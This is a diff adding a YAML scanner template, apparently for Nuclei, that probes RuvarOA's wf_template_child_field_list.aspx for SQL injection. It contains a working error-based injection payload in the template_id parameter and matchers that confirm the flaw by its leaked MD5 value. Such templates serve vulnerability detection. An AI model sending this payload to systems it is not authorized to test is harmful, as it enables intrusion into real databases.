@@ -1,0 +1,27 @@
+id: poc-yaml-ruvaroa-wf-template-child-field-list-sqli
+info:
+  name: RuvarOA wf_template_child_field_list SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: ruvar-oa
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/SysManage/wf_template_child_field_list.aspx?template_id=(-1)+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "[Exception]:"
+          - "转换成数据类型 int 时失败"
+          - "RuvarOA"
+          - "0x{{t2}}"
+        part: body
